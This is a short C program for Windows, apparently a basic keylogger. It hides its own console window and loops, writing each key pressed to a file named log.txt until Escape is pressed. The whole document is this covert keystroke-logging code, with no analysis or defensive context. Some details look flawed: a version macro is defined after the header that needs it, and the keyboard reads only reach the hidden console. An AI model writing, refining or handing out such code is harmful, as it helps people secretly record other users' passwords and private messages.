#include <stdio.h>                              //standard input/output
#include <conio.h>                              //for kbhit and getch
#include <windows.h>                            //for console control

#define _WIN32_WINNT 0x0500                     //specifing windows version

#define FILENAME "log.txt"                      //destination file

void logToFile(char *key)
{
    FILE *f = fopen(FILENAME, "a");

    switch(*key)
    {
        case 13: fprintf(f, "\n"); break;       //Breaks line on ENTER
        default: fprintf(f, "%c", *key);        //writes to file on deafult
    }

    fclose(f);
}

int main()
{
    char key = 0;

    HWND console = GetConsoleWindow();         //gets console handle
    ShowWindow(console, SW_HIDE);              //hides console

    while(1)
    {
        if(kbhit())                            //on key press
        {
            key = getch();
            if(key == 27) break;
            logToFile(&key);
        }
    }

    return 0;
}
